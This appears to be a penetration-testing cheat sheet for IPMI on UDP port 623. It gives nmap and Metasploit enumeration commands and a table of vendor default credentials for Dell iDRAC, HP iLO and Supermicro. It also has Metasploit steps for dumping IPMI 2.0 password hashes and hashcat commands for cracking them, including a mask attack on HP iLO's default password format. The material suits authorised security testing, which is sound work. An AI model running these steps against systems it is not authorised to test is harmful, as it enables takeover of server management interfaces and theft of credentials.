# 623/UDP - IPMI

### Service enumeration

#### Scan

```sh
sudo nmap -sU --script ipmi-version -p 623 <IP>
use auxiliary/scanner/ipmi/ipmi_version
```

#### Default creds

| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |

### Exploitation

#### Dump hashes

IPMI-2.0 is vulnerable to a CVE that lets us dump hashes

```sh
use auxiliary/scanner/ipmi/ipmi_dumphashes 
```

We can then try to crack those hashes

```sh
hashcat -m 7300 <HASH> <WORDLIST>

# If HP ILO
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```
